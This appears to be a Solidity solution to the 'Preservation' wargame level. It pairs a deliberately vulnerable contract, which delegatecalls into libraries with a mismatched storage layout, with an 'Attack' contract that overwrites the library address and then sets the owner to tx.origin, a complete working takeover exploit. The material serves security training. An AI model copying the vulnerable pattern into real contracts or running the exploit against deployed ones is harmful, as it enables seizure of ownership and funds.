
pragma solidity ^0.6.0;

contract Preservation {

  
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}


contract LibraryContract {

  
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}

contract Attack {
  address public a;
  address public b;
  address public c;
  Preservation target;

  constructor(Preservation _target) public {
    target = _target;
  }

  function setTime(uint _time) public {
    c = tx.origin;
  }

  function hack() public {
    target.setSecondTime(uint(address(this)));
    target.setFirstTime(0);
  }

  function remixTest() public {
    target.setFirstTime(0);
  }
}
